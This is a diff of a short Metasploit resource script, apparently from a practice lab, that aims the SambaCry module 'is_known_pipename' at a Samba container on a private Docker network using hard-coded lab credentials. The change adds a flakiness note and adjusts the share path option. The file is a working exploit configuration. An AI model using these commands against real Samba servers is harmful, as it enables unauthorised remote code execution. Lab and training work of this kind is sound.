@@ -5,11 +5,13 @@
 #   - samba container running (docker compose up -d samba)
 #   - Kali on 172.20.0.5
 # Credentials: sambacry:nosambanocry
+#
+# Note: This exploit can be flaky. If it fails, try 'exploit' again.
 
 use exploit/linux/samba/is_known_pipename
 set RHOSTS 172.20.0.16
 set SMB_SHARE_NAME data
-set SMB_FOLDER /
+set SMB_SHARE_BASE /data
 set SMBUser sambacry
 set SMBPass nosambanocry
 exploit
